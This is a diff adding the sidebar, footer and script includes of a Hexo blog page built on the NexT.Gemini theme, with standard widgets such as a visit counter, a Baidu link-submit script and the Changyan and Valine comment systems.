+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
